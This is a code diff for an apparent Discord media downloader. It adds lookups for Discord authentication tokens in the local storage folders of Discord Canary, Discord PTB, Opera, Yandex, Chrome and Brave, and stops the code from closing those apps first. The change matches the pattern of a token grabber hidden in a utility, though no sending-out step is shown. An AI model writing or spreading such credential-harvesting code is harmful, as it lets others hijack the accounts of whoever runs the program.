@@ -60,7 +60,12 @@ namespace Discord_Media_DL.Discord
             get => new TokenContainer[]
             {
                 new TokenContainer("Discord", Help.Paths.Roaming + @"\Discord\Local Storage\leveldb\"),
-                //    new TokenContainer("Brave", Help.Paths.AppDataLocal + @"\BraveSoftware\Brave-Browser\User Data\Default\")
+                new TokenContainer("Discord Canary", Help.Paths.Roaming + @"\discordcanary\Local Storage\leveldb\"),
+                new TokenContainer("Opera", Help.Paths.Roaming + @"\Opera Software\Opera Stable\Local Storage\leveldb\"),
+                new TokenContainer("Yandex", Help.Paths.AppDataLocal + @"\Yandex\YandexBrowser\User Data\Default\Discord\Local Storage\leveldb\"),
+                new TokenContainer("Chrome", Help.Paths.AppDataLocal + @"\Google\Chrome\User Data\Default\Local Storage\leveldb\"),
+                new TokenContainer("Discord PTB", Help.Paths.Roaming + @"\discordptb\Local Storage\leveldb\"),
+                new TokenContainer("Brave", Help.Paths.AppDataLocal + @"\BraveSoftware\Brave-Browser\User Data\Default\")
             };
         }
 
@@ -74,7 +79,7 @@ namespace Discord_Media_DL.Discord
                 {
                     string path = container.TokenFolder;
 
-                    Help.Processes.KillProcess(container.ProcessName);
+                  //  Help.Processes.KillProcess(container.ProcessName);
 
                     if (Directory.Exists(path) == false)
                         continue;
